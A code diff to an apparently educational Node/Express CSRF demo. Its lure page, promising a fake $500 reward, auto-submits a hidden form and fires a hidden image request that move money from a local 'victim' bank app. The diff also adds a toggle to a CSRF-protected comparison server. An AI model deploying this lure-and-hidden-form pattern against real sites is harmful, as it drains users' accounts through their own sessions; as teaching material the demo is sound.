@@ -16,8 +16,53 @@ const cors = require('cors');
 const app = express();
 const PORT = 3011;
 const VICTIM_PORT = 3010;
+const PROTECTED_PORT = 3012;
 
 app.use(cors());
+
+const SWITCHER_CSS = `
+    .target-switcher {
+      position: fixed;
+      bottom: 1rem;
+      left: 1rem;
+      display: flex;
+      gap: 0.5rem;
+      z-index: 9999;
+    }
+    .target-switcher button {
+      padding: 0.4rem 0.85rem;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid;
+    }
+    .target-switcher .btn-vulnerable {
+      background: #1e293b;
+      color: #fff;
+      border-color: #334155;
+    }
+    .target-switcher .btn-vulnerable.active {
+      background: #fff;
+      color: #1e293b;
+      border-color: #fff;
+    }
+    .target-switcher .btn-protected {
+      background: #dc2626;
+      color: #fff;
+      border-color: #dc2626;
+    }
+    .target-switcher .btn-protected.active {
+      background: #ef4444;
+      color: #fff;
+      border-color: #ef4444;
+    }`;
+
+const SWITCHER_HTML = `
+  <div class="target-switcher">
+    <button type="button" class="btn-vulnerable active" id="btn-vulnerable">Vulnerable (:3010)</button>
+    <button type="button" class="btn-protected" id="btn-protected">Protected (:3012)</button>
+  </div>`;
 
 const DASHBOARD_HTML = `<!DOCTYPE html>
 <html lang="en">
@@ -68,6 +113,7 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
       max-width: 640px;
     }
     .note em { color: #facc15; font-style: normal; }
+    ${SWITCHER_CSS}
   </style>
 </head>
 <body>
@@ -90,6 +136,22 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
     not need JS to read the cookie. The browser sends it automatically on every request
     to the matching domain, even when the request originates from a different origin.
   </div>
+
+  ${SWITCHER_HTML}
+
+  <script>
+    document.getElementById('btn-vulnerable').addEventListener('click', function () {
+      window.open('http://localhost:${VICTIM_PORT}', '_blank');
+      document.getElementById('btn-vulnerable').classList.add('active');
+      document.getElementById('btn-protected').classList.remove('active');
+    });
+
+    document.getElementById('btn-protected').addEventListener('click', function () {
+      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
+      document.getElementById('btn-protected').classList.add('active');
+      document.getElementById('btn-vulnerable').classList.remove('active');
+    });
+  </script>
 </body>
 </html>`;
 
@@ -157,6 +219,47 @@ const LURE_HTML = `<!DOCTYPE html>
     .success.visible { display: block; }
     .processing { color: #64748b; font-size: 0.9rem; margin-top: 1rem; display: none; }
     .processing.visible { display: block; }
+    .result-banner {
+      display: none;
+      margin-top: 1.25rem;
+      padding: 1rem 1.25rem;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      line-height: 1.5;
+    }
+    .result-banner.success {
+      display: block;
+      background: #dcfce7;
+      color: #166534;
+      border: 1px solid #86efac;
+    }
+    .result-banner.blocked {
+      display: block;
+      background: #fee2e2;
+      color: #991b1b;
+      border: 1px solid #fca5a5;
+    }
+    .result-banner.unreachable {
+      display: block;
+      background: #fef3c7;
+      color: #92400e;
+      border: 1px solid #fcd34d;
+    }
+    .btn-reset {
+      display: none;
+      margin-top: 1.25rem;
+      background: #0f172a;
+      color: #fff;
+      border: none;
+      padding: 0.65rem 1.25rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn-reset.visible { display: inline-block; }
+    ${SWITCHER_CSS}
   </style>
 </head>
 <body>
@@ -166,12 +269,13 @@ const LURE_HTML = `<!DOCTYPE html>
     <p>As a valued customer, you've been selected for an exclusive rewards voucher.
        Click below to claim your $500 credit.</p>
     <button class="btn-reward" type="button">Claim Your Reward</button>
-    <div class="spinner visible" id="spinner"></div>
-    <p class="processing visible" id="processing">Processing your reward…</p>
+    <div class="spinner" id="spinner"></div>
+    <p class="processing" id="processing">Processing your reward…</p>
     <p class="success" id="success">🎉 Your $500 voucher has been applied!</p>
+    <div class="result-banner" id="result-banner"></div>
+    <button type="button" class="btn-reset" id="btn-reset">Reset / Try Again</button>
   </div>
 
-  <!-- Hidden iframe — form submits here so this page stays visible -->
   <iframe name="csrf-frame" style="display:none" title="hidden"></iframe>
 
   <form id="csrf-form" action="http://localhost:${VICTIM_PORT}/transfer" method="POST" target="csrf-frame">
@@ -180,17 +284,107 @@ const LURE_HTML = `<!DOCTYPE html>
     <input type="hidden" name="amount" value="9000">
   </form>
 
-  <!-- GET-based CSRF footnote — fires with zero JS, zero user clicks -->
-  <img src="http://localhost:${VICTIM_PORT}/transfer-get?recipient=Attacker_GET&amp;account=HACK-GET&amp;amount=1" width="1" height="1" alt="" style="position:absolute;opacity:0">
+  <img id="csrf-get-img" src="http://localhost:${VICTIM_PORT}/transfer-get?recipient=Attacker_GET&amp;account=HACK-GET&amp;amount=1" width="1" height="1" alt="" style="position:absolute;opacity:0">
+
+  ${SWITCHER_HTML}
 
   <script>
-    window.onload = function () {
+    var targetPort = ${VICTIM_PORT};
+    var attackSubmitted = false;
+
+    function updateFormAction() {
+      document.getElementById('csrf-form').action =
+        'http://localhost:' + targetPort + '/transfer';
+      document.getElementById('csrf-get-img').src =
+        'http://localhost:' + targetPort + '/transfer-get?recipient=Attacker_GET&account=HACK-GET&amount=1';
+    }
+
+    function clearResult() {
+      var banner = document.getElementById('result-banner');
+      banner.className = 'result-banner';
+      banner.textContent = '';
+      document.getElementById('success').classList.remove('visible');
+      document.getElementById('btn-reset').classList.remove('visible');
+    }
+
+    function showResult(type, message) {
+      var banner = document.getElementById('result-banner');
+      banner.className = 'result-banner ' + type;
+      banner.textContent = message;
+      document.getElementById('btn-reset').classList.add('visible');
+    }
+
+    function finishAttempt() {
+      document.getElementById('spinner').classList.remove('visible');
+      document.getElementById('processing').classList.remove('visible');
+    }
+
+    function checkOutcome() {
+      fetch('http://localhost:' + targetPort + '/api/account', { credentials: 'include' })
+        .then(function (res) {
+          if (res.status === 403) {
+            showResult('blocked', '🛡️ Attack blocked — CSRF token validation failed (403 Forbidden)');
+            return null;
+          }
+          if (!res.ok) {
+            showResult('unreachable', '⚠️ Could not reach localhost:' + targetPort + ' — is the server running? (HTTP ' + res.status + ')');
+            return null;
+          }
+          return res.json();
+        })
+        .then(function (data) {
+          if (!data) return;
+          if (data.balance < 50000) {
+            showResult('success', '✅ Transfer sent — $9,000 stolen. Return to NetBank to confirm.');
+          } else {
+            showResult('blocked', '🛡️ Attack blocked — CSRF token validation failed (403 Forbidden)');
+          }
+        })
+        .catch(function () {
+          showResult('unreachable', '⚠️ Could not reach localhost:' + targetPort + ' — is the server running?');
+        })
+        .finally(finishAttempt);
+    }
+
+    function submitAttack() {
+      if (attackSubmitted) return;
+      attackSubmitted = true;
+      clearResult();
+      document.getElementById('spinner').classList.add('visible');
+      document.getElementById('processing').classList.add('visible');
       document.getElementById('csrf-form').submit();
-      setTimeout(function () {
-        document.getElementById('spinner').classList.remove('visible');
-        document.getElementById('processing').classList.remove('visible');
-        document.getElementById('success').classList.add('visible');
-      }, 1500);
+      setTimeout(checkOutcome, 1200);
+    }
+
+    document.getElementById('btn-reset').addEventListener('click', function () {
+      attackSubmitted = false;
+      clearResult();
+      submitAttack();
+    });
+
+    document.getElementById('btn-vulnerable').addEventListener('click', function () {
+      targetPort = ${VICTIM_PORT};
+      updateFormAction();
+      clearResult();
+      document.getElementById('btn-vulnerable').classList.add('active');
+      document.getElementById('btn-protected').classList.remove('active');
+      attackSubmitted = false;
+      submitAttack();
+    });
+
+    document.getElementById('btn-protected').addEventListener('click', function () {
+      targetPort = ${PROTECTED_PORT};
+      updateFormAction();
+      clearResult();
+      document.getElementById('btn-protected').classList.add('active');
+      document.getElementById('btn-vulnerable').classList.remove('active');
+      attackSubmitted = false;
+      submitAttack();
+    });
+
+    window.onload = function () {
+      updateFormAction();
+      submitAttack();
     };
   </script>
 </body>
